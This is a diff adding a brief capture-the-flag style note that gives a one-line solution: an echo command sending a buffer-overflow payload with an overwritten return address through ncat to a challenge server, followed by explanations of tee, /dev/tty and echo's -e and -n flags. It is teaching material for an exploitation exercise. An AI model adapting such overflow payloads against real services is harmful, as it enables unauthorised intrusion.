@@ -1,0 +1,17 @@
+For terminal based solution..
+
+echo -en "AAAAAAsAABAAAAAnAACAAAAAAAAAAAAAAAAAEAAa\xa6\x11\x40\x00\x00\x00\x00\x00" | ncat <server ip> 1337 | tee /dev/tty
+
+tee is a command that can duplex the output of one command and channel it into two files
+/dev/tty referes to the output of the terminal
+
+echo hi > /dev/tty
+is essentially the same as
+echo hi
+
+ncat <server ip> 1337
+
+-e enables encoding of bytes when input specifies \x 
+-n removes the newline after the echo, which probably what you want
+
+
